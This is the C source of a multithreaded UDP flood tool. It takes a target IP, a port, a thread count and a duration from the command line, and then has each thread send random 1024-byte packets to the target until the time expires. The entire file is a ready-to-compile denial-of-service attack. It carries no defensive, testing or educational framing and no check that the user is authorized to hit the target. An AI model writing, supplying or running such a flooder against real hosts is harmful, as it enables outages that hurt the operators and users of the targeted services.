#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>

#define PACKET_SIZE 1024

typedef struct {
    struct sockaddr_in server;
    time_t end_time;
} ThreadArgs;

void* udp_flood(void* arg) {
    ThreadArgs args = *(ThreadArgs*)arg;  // Copy struct to avoid shared memory issues
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    char payload[PACKET_SIZE];
    
    // Unique random seed per thread
    srand(time(NULL) ^ pthread_self());

    while (time(NULL) < args.end_time) {
        // Generate a random payload
        for (int i = 0; i < PACKET_SIZE; i++) {
            payload[i] = rand() % 256;
        }

        ssize_t sent_bytes = sendto(sock, payload, PACKET_SIZE, 0,
                                    (struct sockaddr*)&args.server, sizeof(args.server));

        if (sent_bytes < 0) {
            fprintf(stderr, "sendto failed: %s\n", strerror(errno));
            break;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Threads> <Time (seconds)>\n", argv[0]);
        return 1;
    }

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(argv[2]));
    
    if (inet_pton(AF_INET, argv[1], &server.sin_addr) <= 0) {
        perror("Invalid IP address");
        return 1;
    }

    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    time_t end_time = time(NULL) + duration;

    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n",
           argv[1], atoi(argv[2]), duration, threads);

    pthread_t thread_pool[threads];
    ThreadArgs args;
    args.server = server;
    args.end_time = end_time;

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args) != 0) {
            perror("Failed to create thread");
            return 1;
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("UDP flood completed.\n");
    return 0;
}
